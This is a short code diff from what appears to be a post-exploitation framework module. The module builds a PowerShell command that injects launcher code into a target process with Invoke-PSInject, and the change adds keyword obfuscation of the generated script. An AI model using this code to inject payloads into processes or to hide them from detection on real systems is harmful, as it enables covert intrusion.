@@ -140,7 +140,8 @@ class Module(object):
                     scriptEnd += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)
                 else:
                     scriptEnd += "Invoke-PSInject -ProcName %s -PoshCode %s" % (procName, launcherCode)
-                if obfuscate:
-                    scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-                script += scriptEnd
-                return script
+                scriptEnd = helpers.keyword_obfuscation(scriptEnd, self.mainMenu)
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
+        return script
